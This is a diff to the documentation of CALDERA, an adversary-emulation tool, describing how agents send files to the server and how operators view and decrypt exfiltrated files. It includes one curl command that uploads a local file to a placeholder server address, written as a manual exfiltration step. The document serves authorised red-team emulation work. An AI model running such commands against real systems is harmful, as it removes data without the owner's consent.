@@ -2,15 +2,23 @@
 
 After completing an operation a user may want to review the data retreived from the target system. This data is automatically stored on the CALDERA server in a directory specified in [/conf/default.yml](Server-configuration.html#the-existing-default-yml).
 
-## Accessing Exfiltrated Files
+## Exfiltrating Files
 
-Some abilities will return files from the agent to the CALDERA server. This can also be done manually with 
+Some abilities will transfer files from the agent to the CALDERA server. This can be done manually with 
 ```yaml
 curl -X POST -F 'data=@/file/path/' http://server_ip:8888/file/upload
 ```
 Note: localhost could be rejected in place of the server IP. In this case you will get error 7. You should type out the full IP.
-These files are sent from the agent to server_ip/file/upload at which point the server places these files inside the directory specified by [/conf/default.yml to key "exfil_dir"](Server-configuration.html#the-existing-default-yml). By default it is set to /tmp
+These files are sent from the agent to server_ip/file/upload at which point the server places these files inside the directory specified by [/conf/default.yml to key "exfil_dir"](Server-configuration.html#the-existing-default-yml). By default it is set to /tmp/caldera
 
+## Accessing Exfiltrated Files
+
+The server stores all exfiltrated files inside the directory specified by [/conf/default.yml to key "exfil_dir"](Server-configuration.html#the-existing-default-yml). By default it is set to /tmp/caldera
+Files can be accessed by pulling them directly from that location when on the server and manually unencrypting the files.
+
+To simplify accessing exfiltrated files from a running caldera server, you can go the the advanced section in the CALDERA UI and click on the 'exfilled files' section.
+From there you can select an operation (or all) from the drop down to see a listing of all the files in the exfil folder corresponding to the operation (specifically works with sandcat agents or any other agent using the same naming scheme for file upload folder) or in the directory along with the option to select any number of files to download directly to your machine.
+All downloaded files will be unencrypted before passing along as a download.
 
 ## Accessing Operations Reports
 
